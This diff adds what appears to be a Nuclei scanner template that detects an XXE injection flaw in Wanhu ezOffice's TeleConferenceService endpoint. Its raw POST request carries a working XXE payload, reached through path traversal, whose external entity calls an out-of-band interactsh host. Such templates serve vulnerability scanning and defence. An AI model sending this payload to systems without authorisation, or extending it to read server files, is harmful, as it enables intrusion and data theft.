@@ -1,0 +1,26 @@
+http:
+    - matchers:
+        - status:
+            - 404
+          type: status
+        - part: interactsh_protocol
+          type: word
+          words:
+            - http
+            - dns
+      matchers-condition: and
+      raw:
+        - "POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1\nHost: {{Hostname}}\n\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE ANY [\n<!ENTITY xxe SYSTEM \"http://{{interactsh-url}}\" >]>        \n<value>&xxe;</value>\n"
+id: wanhu-ezoffice-teleconferenceservice-xxe
+info:
+    author: pphua
+    description: 万户ezoffice TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息
+    name: 万户ezoffice TeleConferenceService XXE注入漏洞
+    reference: null
+    severity: medium
+    tags:
+        - wanhu
+        - xxe
+        - ezoffice
+        - Eserv
+        - eserv
